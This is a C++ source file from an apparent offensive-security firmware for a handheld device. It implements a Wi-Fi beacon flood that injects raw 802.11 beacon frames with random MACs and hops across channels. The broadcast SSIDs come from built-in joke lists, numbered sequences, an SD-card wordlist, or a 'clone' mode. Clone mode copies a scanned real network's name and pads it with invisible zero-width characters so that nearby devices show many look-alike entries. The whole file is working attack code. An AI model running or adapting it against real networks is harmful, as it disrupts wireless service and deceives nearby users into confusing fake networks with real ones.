// T-REX — offensive security firmware for LilyGo T-Deck
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// Portions derived from Bruce firmware (https://github.com/pr3y/Bruce)
// Bruce is licensed under the GNU Affero General Public License v3.0 (AGPL-3.0).
// Modifications licensed under AGPL-3.0-or-later.

#include "beacon_flood.h"
#include "display_manager.h"
#include "input_handling.h"
#include "sdcard_manager.h"
#include "wifi_functions.h"
#include "lockscreen_manager.h"
#include "constants.h"
#include <WiFi.h>
#include <SD.h>
#include <esp_wifi.h>

extern DisplayManager  displayManager;
extern InputHandling   inputHandler;
extern SDCardManager   sdCardManager;
extern WiFiFunctions   wifiFunctions;

// Max beacon frame size: 24 (header) + 10 (timestamp+interval) + 2 (capability)
// + 2+32 (SSID IE max) + 10 (Rates IE) + 3 (DS Param IE) + 22 (RSN IE) = 105 bytes
#define BF_PKT_LEN 105

// Shared sub-frame blobs used by buildBeacon
static const uint8_t BF_RATES[] = {
    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C
};
static const uint8_t BF_RSN[] = {
    0x30, 0x14,
    0x01, 0x00,
    0x00, 0x0F, 0xAC, 0x04,
    0x01, 0x00,
    0x00, 0x0F, 0xAC, 0x04,
    0x01, 0x00,
    0x00, 0x0F, 0xAC, 0x02,
    0x00, 0x00,
};

// ── Built-in SSID list (PROGMEM) ──────────────────────────────────────────────

static const char BF_SSIDS[] PROGMEM =
    "Abraham Linksys\n"
    "Silence of the LANs\n"
    "Bill Wi the Science Fi\n"
    "The LAN Before Time\n"
    "Pretty Fly for a WiFi\n"
    "FBI Surveillance Van\n"
    "Router I Hardly Know Her\n"
    "Loading...\n"
    "GetOffMyLawn\n"
    "TellMyWiFiLoveHer\n"
    "I Can Haz Wireless?\n"
    "Not Your WiFi\n"
    "John Wilkes Bluetooth\n"
    "HideYoKidsHideYoWifi\n"
    "Nacho WiFi\n"
    "Mom Use This One\n"
    "The Promised LAN\n"
    "Hack This If You Can\n"
    "Skynet Global Defense\n"
    "NSA Listening Post\n"
    "INTERPOL Mobile Unit\n"
    "Please Connect Me\n"
    "Virus.exe\n"
    "SurveillanceVan3\n"
    "I_Believe_Wi_Can_Fi\n"
    "WifiNetwork\n"
    "The Matrix Has You\n"
    "TwoWireless2Furious\n"
    "This Is Not Free WiFi\n"
    "Wu-Tang LAN\n"
    "It Hurts When IP\n"
    "Winternet Is Coming\n"
    "404 Network Unavailable\n"
    "NoMoreMrWiFiGuy\n"
    "Definitely Not FBI\n"
    "CIAvsSELinux\n"
    "PrettyFlyForAWiFi\n"
    "RouterOfAllEvil\n"
    "MoreLikeWirelessLAN\n"
    "Network Not Found\n";

static const char BF_RICKROLL[] PROGMEM =
    "01 Never gonna give you up\n"
    "02 Never gonna let you down\n"
    "03 Never gonna run around\n"
    "04 And desert you\n"
    "05 Never gonna make you cry\n"
    "06 Never gonna say goodbye\n"
    "07 Never gonna tell a lie\n"
    "08 And hurt you\n";

// ── Frame builder ─────────────────────────────────────────────────────────────

static void randomLaMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)esp_random();
    mac[0] = (mac[0] & 0xFE) | 0x02;   // locally administered, unicast
}

// Builds a properly packed beacon (no SSID zero-padding) so IE parsers always
// find Supported Rates and RSN IE immediately after the actual SSID data.
// Returns actual frame length.
static uint8_t buildBeacon(uint8_t* pkt, const char* ssid, uint8_t ch, bool isOpen) {
    uint8_t ssidLen = (uint8_t)strnlen(ssid, 32);
    uint8_t* p = pkt;

    // 802.11 MAC header
    p[0] = 0x80; p[1] = 0x00;               // Frame Control: beacon
    p[2] = 0x00; p[3] = 0x00;               // Duration
    memset(p + 4, 0xFF, 6);                  // DA: broadcast
    uint8_t mac[6]; randomLaMac(mac);
    memcpy(p + 10, mac, 6);                  // SA
    memcpy(p + 16, mac, 6);                  // BSSID
    uint16_t seq = (uint16_t)(esp_random() & 0xFFF);
    p[22] = (uint8_t)(seq >> 4);
    p[23] = (uint8_t)((seq & 0xF) << 4);
    p += 24;

    // Fixed parameters
    memset(p, 0, 8);  p += 8;               // Timestamp
    p[0] = 0x64; p[1] = 0x00; p += 2;       // Beacon interval: 100 TU
    p[0] = isOpen ? 0x21 : 0x31;            // Capability: ESS+[Privacy]+ShortPreamble
    p[1] = 0x04;                             // ShortSlot
    p += 2;

    // SSID IE — no padding, length = actual SSID bytes
    p[0] = 0x00; p[1] = ssidLen;
    memcpy(p + 2, ssid, ssidLen);
    p += 2 + ssidLen;

    // Supported Rates IE
    memcpy(p, BF_RATES, sizeof(BF_RATES)); p += sizeof(BF_RATES);

    // DS Parameter Set IE
    p[0] = 0x03; p[1] = 0x01; p[2] = ch; p += 3;

    // RSN IE (WPA2 only)
    if (!isOpen) {
        memcpy(p, BF_RSN, sizeof(BF_RSN)); p += sizeof(BF_RSN);
    }

    return (uint8_t)(p - pkt);
}

static inline void sendBeacon(uint8_t* pkt, const char* ssid, uint8_t ch,
                               bool isOpen, uint32_t& ok, uint32_t& fail) {
    uint8_t frameLen = buildBeacon(pkt, ssid, ch, isOpen);
    for (int i = 0; i < 2; i++) {
        esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, pkt, frameLen, false);
        if (e == ESP_OK) ok++; else fail++;
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

// ── Channel hopping ───────────────────────────────────────────────────────────

static const uint8_t BF_CHANNELS[] = { 1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10 };
static uint8_t s_chIdx = 0;

static uint8_t nextChannel() {
    s_chIdx = (s_chIdx + 1) % (sizeof(BF_CHANNELS) / sizeof(BF_CHANNELS[0]));
    uint8_t ch = BF_CHANNELS[s_chIdx];
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    return ch;
}

// ── Display ───────────────────────────────────────────────────────────────────

static void drawHeader(const char* modeLabel) {
    displayManager.clearScreen();
    displayManager.setDefaultTextSize();
    displayManager.setCursor(4, outputY);
    displayManager.setTextColor(0x7BEF);   displayManager.printText("[");
    displayManager.setTextColor(TFT_CYAN); displayManager.printText("BCON");
    displayManager.setTextColor(0x7BEF);   displayManager.printText("::");
    displayManager.setTextColor(TFT_YELLOW); displayManager.printText("FLOOD");
    displayManager.setTextColor(0x7BEF);   displayManager.printText("]  ");
    displayManager.setTextColor(TFT_WHITE); displayManager.println(modeLabel);
    displayManager.printSeparator();
}

static void drawStats(int32_t statsY, uint32_t sent, uint32_t fail,
                      uint8_t ch, const char* curSsid, uint32_t rate) {
    if (displayManager.isBlocked()) return;
    displayManager.fillRect(0, statsY, SCREEN_WIDTH, LINE_HEIGHT * 5 + 4, TFT_BLACK);
    displayManager.setCursor(4, statsY);

    displayManager.setTextColor(0x7BEF);   displayManager.printText("Ch: ");
    displayManager.setTextColor(TFT_GREEN); char chBuf[4]; snprintf(chBuf, sizeof(chBuf), "%2u", ch);
    displayManager.printText(chBuf);
    displayManager.setTextColor(0x7BEF);   displayManager.printText("   Sent: ");
    displayManager.setTextColor(TFT_YELLOW);
    char sentBuf[12]; snprintf(sentBuf, sizeof(sentBuf), "%lu", (unsigned long)sent);
    displayManager.println(sentBuf);

    displayManager.setCursor(4, displayManager.getCursorY());
    displayManager.setTextColor(0x7BEF);   displayManager.printText("Err: ");
    displayManager.setTextColor(fail > 0 ? TFT_RED : TFT_GREEN);
    char failBuf[12]; snprintf(failBuf, sizeof(failBuf), "%lu", (unsigned long)fail);
    displayManager.printText(failBuf);
    displayManager.setTextColor(0x7BEF);   displayManager.printText("   Rate: ~");
    displayManager.setTextColor(TFT_WHITE);
    char rateBuf[8]; snprintf(rateBuf, sizeof(rateBuf), "%lu/s", (unsigned long)rate);
    displayManager.println(rateBuf);

    displayManager.setCursor(4, displayManager.getCursorY());
    displayManager.setTextColor(0x7BEF);   displayManager.printText("SSID: ");
    displayManager.setTextColor(TFT_CYAN);
    // Truncate for display width
    char ssidBuf[26]; snprintf(ssidBuf, sizeof(ssidBuf), "%.25s", curSsid);
    displayManager.println(ssidBuf);

    displayManager.setCursor(4, displayManager.getCursorY());
    displayManager.setTextColor(0x7BEF);
    displayManager.println("[q] stop");
}

// ── WiFi setup/teardown ───────────────────────────────────────────────────────

static void startInjection(uint8_t startCh = 1) {
    WiFi.mode(WIFI_MODE_APSTA);
    WiFi.softAP("x", nullptr, startCh, 1, 0, false);
    delay(100);
    esp_wifi_set_promiscuous(true);
    delay(50);
    s_chIdx = 0;
    esp_wifi_set_channel(startCh, WIFI_SECOND_CHAN_NONE);
    delay(50);
}

static void stopInjection() {
    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
}

// ── Flood loops ───────────────────────────────────────────────────────────────

#define BF_HOP_EVERY   20   // change channel every N beacons
#define BF_DRAW_MS    200   // redraw interval

static void floodList(const char* modeLabel, const char* ssidList, bool isOpen = false) {
    drawHeader(modeLabel);
    int32_t statsY = displayManager.getCursorY();

    uint8_t  pkt[BF_PKT_LEN];
    uint32_t sent = 0, fail = 0;
    uint8_t  ch   = BF_CHANNELS[0];
    uint32_t lastDraw = 0;
    uint32_t lastSentMark = 0;
    uint32_t rate = 0;
    char     curSsid[33] = {};

    while (true) {
        // Walk SSID list from PROGMEM
        const char* p = ssidList;
        while (true) {
            if (LockScreenManager::getInstance().consumeJustUnlocked()) {
                drawHeader(modeLabel);
                statsY = displayManager.getCursorY();
                lastDraw = 0;
            }

            // Check quit
            char k = inputHandler.getKeyboardInput();
            if (k == 'q' || k == 'Q') return;

            // Read one SSID from PROGMEM
            uint8_t slen = 0;
            char ssid[33] = {};
            char c;
            while ((c = (char)pgm_read_byte(p++)) != '\0') {
                if (c == '\n') break;
                if (slen < 32) ssid[slen++] = c;
            }
            ssid[slen] = '\0';
            if (slen == 0) break;   // end of list

            strncpy(curSsid, ssid, sizeof(curSsid) - 1);
            sendBeacon(pkt, ssid, ch, isOpen, sent, fail);

            if (sent % BF_HOP_EVERY == 0) ch = nextChannel();

            uint32_t now = millis();
            if (now - lastDraw >= BF_DRAW_MS) {
                rate = (uint32_t)((sent - lastSentMark) * 1000 / (now - lastDraw + 1));
                lastSentMark = sent;
                lastDraw = now;
                drawStats(statsY, sent, fail, ch, curSsid, rate);
            }
        }
    }
}

static void floodSeq(const char* base, const char* modeLabel) {
    drawHeader(modeLabel);
    int32_t statsY = displayManager.getCursorY();

    uint8_t  pkt[BF_PKT_LEN];
    uint32_t sent = 0, fail = 0;
    uint8_t  ch   = BF_CHANNELS[0];
    uint32_t lastDraw = 0;
    uint32_t lastSentMark = 0;
    uint32_t rate = 0;
    uint32_t counter = 1;
    char     curSsid[33] = {};

    while (true) {
        if (LockScreenManager::getInstance().consumeJustUnlocked()) {
            drawHeader(modeLabel);
            statsY = displayManager.getCursorY();
            lastDraw = 0;
        }

        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') return;

        char ssid[33];
        snprintf(ssid, sizeof(ssid), "%.28s%lu", base, (unsigned long)counter);
        strncpy(curSsid, ssid, sizeof(curSsid) - 1);

        sendBeacon(pkt, ssid, ch, false, sent, fail);
        counter++;
        if (counter > 9999) { counter = 1; ch = nextChannel(); }
        if (sent % BF_HOP_EVERY == 0) ch = nextChannel();

        uint32_t now = millis();
        if (now - lastDraw >= BF_DRAW_MS) {
            rate = (uint32_t)((sent - lastSentMark) * 1000 / (now - lastDraw + 1));
            lastSentMark = sent;
            lastDraw = now;
            drawStats(statsY, sent, fail, ch, curSsid, rate);
        }
    }
}

static void floodFile(File& f, const char* modeLabel) {
    drawHeader(modeLabel);
    int32_t statsY = displayManager.getCursorY();

    uint8_t  pkt[BF_PKT_LEN];
    uint32_t sent = 0, fail = 0;
    uint8_t  ch   = BF_CHANNELS[0];
    uint32_t lastDraw = 0;
    uint32_t lastSentMark = 0;
    uint32_t rate = 0;
    char     curSsid[33] = {};

    bool running = true;
    while (running) {
        // One pass through the file, then loop back to start
        f.seek(0);
        while (f.available() && running) {
            if (LockScreenManager::getInstance().consumeJustUnlocked()) {
                drawHeader(modeLabel);
                statsY = displayManager.getCursorY();
                lastDraw = 0;
            }

            char k = inputHandler.getKeyboardInput();
            if (k == 'q' || k == 'Q') { running = false; break; }

            // Read line
            char ssid[33] = {}; uint8_t slen = 0;
            while (f.available() && slen < 32) {
                char c = (char)f.read();
                if (c == '\n' || c == '\r') break;
                if (c >= 0x20 && c <= 0x7E) ssid[slen++] = c;
            }
            // Drain rest of line if longer than 32
            if (slen == 32) {
                char c;
                while (f.available() && (c = (char)f.read()) != '\n');
            }
            ssid[slen] = '\0';
            if (slen == 0) continue;

            strncpy(curSsid, ssid, sizeof(curSsid) - 1);
            sendBeacon(pkt, ssid, ch, false, sent, fail);
            if (sent % BF_HOP_EVERY == 0) ch = nextChannel();

            uint32_t now = millis();
            if (now - lastDraw >= BF_DRAW_MS) {
                rate = (uint32_t)((sent - lastSentMark) * 1000 / (now - lastDraw + 1));
                lastSentMark = sent;
                lastDraw = now;
                drawStats(statsY, sent, fail, ch, curSsid, rate);
            }
        }
    }
}


// ── Clone flood — one real SSID, random MACs ─────────────────────────────────

static void floodClone(const char* ssid, uint8_t targetCh, bool isOpen) {
    char modeLabel[40];
    snprintf(modeLabel, sizeof(modeLabel), "clone %.25s", ssid);
    drawHeader(modeLabel);
    int32_t statsY = displayManager.getCursorY();

    uint8_t  pkt[BF_PKT_LEN];
    uint32_t sent = 0, fail = 0;
    uint8_t  ch   = targetCh;
    uint32_t lastDraw = 0;
    uint32_t lastSentMark = 0;
    uint32_t rate = 0;

    // Append 1..N invisible U+200B (zero-width space, \xE2\x80\x8B) to create
    // visually identical but byte-distinct SSIDs — each shows as a separate scan
    // entry on Windows/Android instead of merging into the real AP's entry.
    static const uint8_t ZWS[3] = { 0xE2, 0x80, 0x8B };
    uint8_t baseLen = (uint8_t)strnlen(ssid, 32);
    uint8_t maxVars = (32 - baseLen) / 3;   // how many ZWS we can fit
    uint8_t varIdx  = 0;

    while (true) {
        if (LockScreenManager::getInstance().consumeJustUnlocked()) {
            drawHeader(modeLabel);
            statsY = displayManager.getCursorY();
            lastDraw = 0;
        }

        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') return;

        char varSsid[33] = {};
        memcpy(varSsid, ssid, baseLen);
        if (maxVars > 0) {
            uint8_t nZws = varIdx + 1;
            for (uint8_t i = 0; i < nZws; i++) {
                uint8_t off = baseLen + i * 3;
                varSsid[off]   = (char)ZWS[0];
                varSsid[off+1] = (char)ZWS[1];
                varSsid[off+2] = (char)ZWS[2];
            }
            varIdx = (varIdx + 1) % maxVars;
        }

        sendBeacon(pkt, varSsid, ch, isOpen, sent, fail);
        // Locked to target channel — no hopping in clone mode.

        uint32_t now = millis();
        if (now - lastDraw >= BF_DRAW_MS) {
            rate = (uint32_t)((sent - lastSentMark) * 1000 / (now - lastDraw + 1));
            lastSentMark = sent;
            lastDraw = now;
            drawStats(statsY, sent, fail, ch, ssid, rate);   // display clean name
        }
    }
}

// ── Clone network picker ──────────────────────────────────────────────────────

// Returns true and fills ssidOut/chOut/isOpenOut if user picks a network.
static bool pickCloneTarget(char* ssidOut, uint8_t* chOut, bool* isOpenOut) {
    if (!wifiFunctions.isScanDone() || wifiFunctions.getNetworkCount() == 0) {
        displayManager.clearScreen();
        displayManager.setDefaultTextSize();
        displayManager.setCursor(4, outputY);
        displayManager.setTextColor(0x7BEF);   displayManager.printText("[");
        displayManager.setTextColor(TFT_CYAN); displayManager.printText("BCON");
        displayManager.setTextColor(0x7BEF);   displayManager.printText("::");
        displayManager.setTextColor(TFT_YELLOW); displayManager.printText("FLOOD");
        displayManager.setTextColor(0x7BEF);   displayManager.println("]  clone");
        displayManager.printSeparator();
        displayManager.setCursor(4, displayManager.getCursorY());
        displayManager.setTextColor(TFT_RED);
        displayManager.println("No scan data.");
        displayManager.setCursor(4, displayManager.getCursorY());
        displayManager.setTextColor(TFT_WHITE);
        displayManager.println("Run scanwifi first, then bf.");
        displayManager.printSeparator();
        displayManager.setCursor(4, displayManager.getCursorY());
        displayManager.setTextColor(0x7BEF);
        displayManager.println("[q] back");
        while (inputHandler.getKeyboardInput() != 'q') vTaskDelay(pdMS_TO_TICKS(20));
        return false;
    }

    int total = wifiFunctions.getNetworkCount();
    int page  = 0;
    const int PER_PAGE = 9;
    int totalPages = (total + PER_PAGE - 1) / PER_PAGE;

    while (true) {
        displayManager.clearScreen();
        displayManager.setDefaultTextSize();
        displayManager.setCursor(4, outputY);

        char pgBuf[8]; snprintf(pgBuf, sizeof(pgBuf), "%02d/%02d", page + 1, totalPages);
        displayManager.setTextColor(0x7BEF);   displayManager.printText("[");
        displayManager.setTextColor(TFT_CYAN); displayManager.printText("BCON");
        displayManager.setTextColor(0x7BEF);   displayManager.printText("::");
        displayManager.setTextColor(TFT_YELLOW); displayManager.printText("FLOOD");
        displayManager.setTextColor(0x7BEF);   displayManager.printText("]  ");
        displayManager.setTextColor(0x7BEF);   displayManager.println(pgBuf);
        displayManager.printSeparator();

        int start = page * PER_PAGE;
        int end   = start + PER_PAGE < total ? start + PER_PAGE : total;

        for (int i = start; i < end; i++) {
            char ssid[33] = {}; int ch = 0; uint8_t bssid[6];
            wifiFunctions.getNetworkSSID(i, ssid);
            wifiFunctions.getNetworkInfo(i, bssid, &ch);

            char line[52];
            snprintf(line, sizeof(line), "[%d] ch%-2d %.24s", i - start + 1, ch,
                     ssid[0] ? ssid : "<hidden>");
            displayManager.setCursor(4, displayManager.getCursorY());
            displayManager.setTextColor(TFT_WHITE);
            displayManager.println(line);
        }

        displayManager.printSeparator();
        displayManager.setCursor(4, displayManager.getCursorY());
        displayManager.setTextColor(0x7BEF);
        displayManager.println("1-9=pick  a/l=page  q=cancel");

        while (true) {
            char k = inputHandler.getKeyboardInput();
            if (k == 'q' || k == 'Q') return false;
            if ((k == 'l' || k == 'L') && page < totalPages - 1) { page++; break; }
            if ((k == 'a' || k == 'A') && page > 0)              { page--; break; }
            if (k >= '1' && k <= '9') {
                int rel = (k - '1');
                int idx = page * PER_PAGE + rel;
                if (idx < total) {
                    int ch = 0; uint8_t bssid[6];
                    wifiFunctions.getNetworkSSID(idx, ssidOut);
                    wifiFunctions.getNetworkInfo(idx, bssid, &ch);
                    *chOut    = (uint8_t)(ch > 0 && ch <= 13 ? ch : 1);
                    *isOpenOut = wifiFunctions.getNetworkOpen(idx);
                    return true;
                }
            }
            vTaskDelay(pdMS_TO_TICKS(20));
        }
    }
}

// ── Seq base input ────────────────────────────────────────────────────────────

static bool promptSeqBase(char* out, size_t outLen) {
    displayManager.clearScreen();
    displayManager.setDefaultTextSize();
    displayManager.setCursor(4, outputY);
    displayManager.setTextColor(0x7BEF);   displayManager.printText("[");
    displayManager.setTextColor(TFT_CYAN); displayManager.printText("BCON");
    displayManager.setTextColor(0x7BEF);   displayManager.printText("::");
    displayManager.setTextColor(TFT_YELLOW); displayManager.printText("FLOOD");
    displayManager.setTextColor(0x7BEF);   displayManager.println("]  seq base");
    displayManager.printSeparator();
    displayManager.setCursor(4, displayManager.getCursorY());
    displayManager.setTextColor(TFT_WHITE);
    displayManager.println("Base SSID for seq flood:");
    displayManager.setCursor(4, displayManager.getCursorY());
    displayManager.setTextColor(0x7BEF);
    displayManager.println("Enter=confirm  empty Enter=cancel");
    displayManager.setCursor(4, displayManager.getCursorY());

    char buf[33] = {}; int len = 0;
    int inputY = displayManager.getCursorY();

    auto redraw = [&]() {
        displayManager.fillRect(4, inputY, SCREEN_WIDTH - 4, LINE_HEIGHT, TFT_BLACK);
        displayManager.setCursor(4, inputY);
        displayManager.setTextColor(TFT_WHITE);
        char tmp[36]; snprintf(tmp, sizeof(tmp), "> %s_", buf);
        displayManager.printText(tmp);
    };
    redraw();

    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (!k) { vTaskDelay(pdMS_TO_TICKS(20)); continue; }
        if (k == '\r' || k == '\n') {
            if (len == 0) return false;   // empty Enter = cancel
            strncpy(out, buf, outLen - 1);
            out[outLen - 1] = '\0';
            return true;
        }
        if ((k == '\b' || k == 0x7F) && len > 0) { buf[--len] = '\0'; redraw(); continue; }
        if (len < 28 && k >= 0x20 && k <= 0x7E) { buf[len++] = k; buf[len] = '\0'; redraw(); }
    }
}

// ── Entry point ───────────────────────────────────────────────────────────────

void runBeaconFlood(char* arg) {
    char    modeBuf[16] = {};
    char    baseBuf[33] = {};
    char    cloneSsid[33] = {};
    uint8_t cloneCh    = 1;
    bool cloneIsOpen   = false;
    bool seqMode       = false;
    bool rickrollMode  = false;
    bool fileMode      = false;
    bool cloneMode     = false;
    char filePath[48]  = "/wordlist_beacons.txt";

    // Direct subcommand bypass
    if (arg && *arg) {
        char tmp[64]; strncpy(tmp, arg, sizeof(tmp) - 1); tmp[sizeof(tmp) - 1] = '\0';
        char* tok = strtok(tmp, " ");
        if (tok) {
            if      (strncasecmp(tok, "list",  4) == 0) {                       strncpy(modeBuf, "list",     sizeof(modeBuf) - 1); }
            else if (strncasecmp(tok, "seq",   3) == 0) { seqMode      = true;  char* b = strtok(nullptr, " "); strncpy(baseBuf, b && *b ? b : "Network_", 32); strncpy(modeBuf, "seq",      sizeof(modeBuf) - 1); }
            else if (strncasecmp(tok, "rick",  4) == 0) { rickrollMode = true;  strncpy(modeBuf, "rickroll", sizeof(modeBuf) - 1); }
            else if (strncasecmp(tok, "file",  4) == 0) { fileMode     = true;  char* p = strtok(nullptr, " "); if (p && *p) strncpy(filePath, p, sizeof(filePath) - 1); strncpy(modeBuf, "file", sizeof(modeBuf) - 1); }
            else if (strncasecmp(tok, "clone", 5) == 0) { cloneMode    = true;  strncpy(modeBuf, "clone",    sizeof(modeBuf) - 1); }
        }
    }

    // Show menu if no valid subcommand
    showMenu:
    if (!seqMode && !rickrollMode && !fileMode && !cloneMode && modeBuf[0] == '\0') {
        displayManager.clearScreen();
        displayManager.setDefaultTextSize();
        displayManager.setCursor(4, outputY);
        displayManager.setTextColor(0x7BEF);   displayManager.printText("[");
        displayManager.setTextColor(TFT_CYAN); displayManager.printText("BCON");
        displayManager.setTextColor(0x7BEF);   displayManager.printText("::");
        displayManager.setTextColor(TFT_YELLOW); displayManager.printText("FLOOD");
        displayManager.setTextColor(0x7BEF);   displayManager.println("]  select mode");
        displayManager.printSeparator();

        displayManager.setCursor(4, displayManager.getCursorY());
        displayManager.setTextColor(TFT_WHITE);  displayManager.println("[1] list      funny SSIDs");
        displayManager.setCursor(4, displayManager.getCursorY());
        displayManager.setTextColor(TFT_WHITE);  displayManager.println("[2] rickroll  Never gonna...");
        displayManager.setCursor(4, displayManager.getCursorY());
        displayManager.setTextColor(TFT_WHITE);  displayManager.println("[3] seq       base + number");
        displayManager.setCursor(4, displayManager.getCursorY());
        displayManager.setTextColor(TFT_WHITE);  displayManager.println("[4] file      /wordlist_beacons.txt");
        displayManager.setCursor(4, displayManager.getCursorY());
        displayManager.setTextColor(TFT_CYAN);   displayManager.println("[5] clone     pick from scan");
        displayManager.printSeparator();
        displayManager.setCursor(4, displayManager.getCursorY());
        displayManager.setTextColor(0x7BEF);     displayManager.println("[q] cancel");

        while (true) {
            char k = inputHandler.getKeyboardInput();
            if (k == 'q' || k == 'Q') { displayManager.printCommandScreen(); return; }
            if (k == '1') { strncpy(modeBuf, "list",     sizeof(modeBuf) - 1); break; }
            if (k == '2') { strncpy(modeBuf, "rickroll", sizeof(modeBuf) - 1); rickrollMode = true; break; }
            if (k == '3') {
                if (!promptSeqBase(baseBuf, sizeof(baseBuf))) { displayManager.printCommandScreen(); return; }
                strncpy(modeBuf, "seq", sizeof(modeBuf) - 1); seqMode = true; break;
            }
            if (k == '4') { strncpy(modeBuf, "file", sizeof(modeBuf) - 1); fileMode  = true; break; }
            if (k == '5') { strncpy(modeBuf, "clone",sizeof(modeBuf) - 1); cloneMode = true; break; }
            vTaskDelay(pdMS_TO_TICKS(20));
        }
    }

    // Clone mode: pick target from scan list before WiFi injection starts
    if (cloneMode) {
        if (!pickCloneTarget(cloneSsid, &cloneCh, &cloneIsOpen)) {
            if (!(arg && *arg)) {
                // came from interactive menu — go back to it
                cloneMode = false;
                memset(modeBuf, 0, sizeof(modeBuf));
                goto showMenu;
            }
            displayManager.printCommandScreen();
            return;
        }
    }

    // GDMA rule: open SD file BEFORE enabling WiFi injection
    File sdFile;
    if (fileMode) {
        if (!sdCardManager.canAccessSD()) {
            displayManager.clearScreen();
            displayManager.setDefaultTextSize();
            displayManager.setCursor(4, outputY);
            displayManager.setTextColor(TFT_RED);
            displayManager.println("No SD card.");
            displayManager.printCommandScreen();
            return;
        }
        sdFile = SD.open(filePath, FILE_READ);
        if (!sdFile) {
            displayManager.clearScreen();
            displayManager.setDefaultTextSize();
            displayManager.setCursor(4, outputY);
            displayManager.setTextColor(TFT_RED);
            char msg[48]; snprintf(msg, sizeof(msg), "Not found: %.30s", filePath);
            displayManager.println(msg);
            displayManager.printCommandScreen();
            return;
        }
    }

    startInjection(cloneMode ? cloneCh : 1);

    if (seqMode)            floodSeq(baseBuf, modeBuf);
    else if (rickrollMode)  floodList(modeBuf, BF_RICKROLL);
    else if (fileMode)      floodFile(sdFile, modeBuf);
    else if (cloneMode)     floodClone(cloneSsid, cloneCh, cloneIsOpen);
    else                    floodList(modeBuf, BF_SSIDS);

    stopInjection();
    if (fileMode && sdFile) sdFile.close();
    displayManager.printCommandScreen();
}
